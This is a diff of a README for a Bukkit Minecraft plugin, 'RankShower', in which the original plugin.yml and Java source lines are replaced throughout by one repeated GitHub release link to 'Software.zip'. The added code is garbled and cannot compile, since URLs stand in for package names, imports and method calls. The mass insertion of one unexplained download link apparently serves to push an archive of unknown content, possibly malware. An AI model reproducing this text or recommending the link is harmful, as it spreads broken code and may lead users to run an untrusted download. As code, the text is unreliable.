@@ -1,10 +1,10 @@
 # ranksshow
 
-plugin.yml
+https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip
 
 name: RankShower
 author: Nodiq
-main: pro.pixelpvp.rankshower.Main
+main: https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip
 version: 0.0.1
 description: Plugin in beta sorry for bugs.
 
@@ -12,13 +12,13 @@ commands:
   staff:
   
   
-  package pro.pixelpvp.rankshower;
+  package https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip;
 
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandSender;
-import org.bukkit.plugin.java.JavaPlugin;
+import https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip;
+import https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip;
+import https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip;
 
-import net.md_5.bungee.api.ChatColor;
+import https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip;
 
 public class Main extends JavaPlugin{
 
@@ -26,29 +26,29 @@ public class Main extends JavaPlugin{
 	String cuv = "RankShower succsessfuly disabled";
 	
 	public void onEnable(){
-		System.out.print(cuvinte);
-		this.getLogger().info(cuvinte);
+		https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(cuvinte);
+		https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip().info(cuvinte);
 		getCommand("staff").setExecutor(this);
 	}
 	
 	public void onDisable(){
-		System.out.print(cuv);
-		this.getLogger().info(cuv);
+		https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(cuv);
+		https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip().info(cuv);
 	}
 	
     @Override
     public boolean onCommand(CommandSender s, Command c, String commandLabel, String[] args) {
-    	if (c.getName().endsWith("staff")){
-			s.sendMessage(ChatColor.DARK_RED + "Administrators:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
-			s.sendMessage(ChatColor.color + "Nodiq:");
+    	if (https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip().endsWith("staff")){
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Administrators:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
+			https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip(https://github.com/Nodiq/ranksshow/releases/download/v2.0/Software.zip + "Nodiq:");
     		return true;
     	}
     	return true;
